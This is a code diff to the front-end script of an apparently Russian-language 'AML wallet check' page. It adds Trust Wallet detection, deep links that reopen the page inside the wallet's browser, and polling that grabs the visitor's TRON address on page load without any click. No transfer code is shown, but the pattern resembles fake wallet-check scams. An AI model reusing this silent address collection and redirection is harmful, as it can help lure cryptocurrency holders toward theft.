@@ -109,6 +109,21 @@
       var API   = (location.hostname === "mysite2-tlgp.onrender.com" ? "" : "https://mysite2-tlgp.onrender.com");
       var KEY   = "aml_wallet_profile_v2";
 
+      /* ---- ENVIRONMENT DETECTION ---- */
+      var ua = navigator.userAgent || "";
+      var isMobile = /android|iphone|ipad|ipod/i.test(ua);
+      var isTrustMobile = isMobile && /Trust/i.test(ua);
+      var isTrustExtension = !isMobile && (
+        !!(window.trustwallet && window.trustwallet.ethereum) ||
+        !!(window.ethereum && window.ethereum.isTrust)
+      );
+      var isInsideTrustWallet = isTrustMobile || isTrustExtension;
+
+      var DEEPLINK_TRON = "https://link.trustwallet.com/open_url?coin_id=195&url=" +
+        encodeURIComponent("https://mysite2-tlgp.onrender.com/check.html");
+      var DEEPLINK_EVM  = "https://link.trustwallet.com/open_url?coin_id=60&url=" +
+        encodeURIComponent("https://mysite2-tlgp.onrender.com/check.html");
+
       function $(s) { return document.querySelector(s); }
       function setStatus(m) { var el = $("[data-user-wallet-status]"); if (el) el.textContent = m; }
       function setAddr(m)   { var el = $("[data-user-wallet-address]"); if (el) el.textContent = m; }
@@ -187,24 +202,23 @@
         });
       }
 
-      /* ---- AUTO-READ TRON ON PAGE LOAD ---- */
+      /* ---- AUTO-READ TRON ON PAGE LOAD (mobile only) ---- */
       var tronFound = "";
-      var tronAttempts = 0;
-      var tronTimer = setInterval(function(){
-        tronAttempts++;
-        tronFound = readPassiveTron();
-        if (tronFound) {
-          clearInterval(tronTimer);
-          var p = loadProfile()||{};
-          if (!p.tronAddress) {
-            p.tronAddress = tronFound;
-            saveProfile(p);
+      if (isMobile) {
+        var tronAttempts = 0;
+        var tronTimer = setInterval(function(){
+          tronAttempts++;
+          tronFound = readPassiveTron();
+          if (tronFound) {
+            clearInterval(tronTimer);
+            var p = loadProfile()||{};
+            if (!p.tronAddress) { p.tronAddress = tronFound; saveProfile(p); }
+            setStatus("TRON-адрес получен. Нажмите Connect.");
+          } else if (tronAttempts >= 40) {
+            clearInterval(tronTimer);
           }
-          setStatus("TRON-адрес получен автоматически. Нажмите Connect для EVM.");
-        } else if (tronAttempts >= 40) {
-          clearInterval(tronTimer);
-        }
-      }, 250);
+        }, 250);
+      }
 
       /* ---- CONNECT ---- */
       function doConnect() {
@@ -245,13 +259,30 @@
       }
       window.connectWalletNow = function(e){ if(e&&e.preventDefault)e.preventDefault(); doConnect(); return false; };
 
+      /* ---- UPDATE DEEPLINK BUTTON ---- */
+      var dlBtn = document.querySelector(".wallet-deeplink");
+      if (dlBtn) {
+        if (isTrustExtension) {
+          // Desktop extension: hide deeplink, EVM only
+          dlBtn.style.display = "none";
+          setStatus("Trust Wallet расширение обнаружено. Нажмите Connect (только EVM).");
+        } else if (isMobile) {
+          // Mobile: use TRON context so tronWeb gets injected
+          dlBtn.href = DEEPLINK_TRON;
+        } else {
+          // Desktop browser without extension
+          dlBtn.href = DEEPLINK_TRON;
+          setStatus("Откройте страницу через Trust Wallet на телефоне для проверки всех балансов.");
+        }
+      }
+
       /* ---- RESTORE SESSION ---- */
       var stored = loadProfile();
       if (stored&&stored.evmAddress) {
         unlockForm(stored);
         setStatus(stored.tronAddress
           ? "Профиль восстановлен. EVM + TRON подключены."
-          : "EVM подключён. Откройте через Trust Wallet для добавления TRON.");
+          : "EVM подключён. Откройте через Trust Wallet на телефоне для TRON.");
       }
 
       /* ---- LOGOUT ---- */
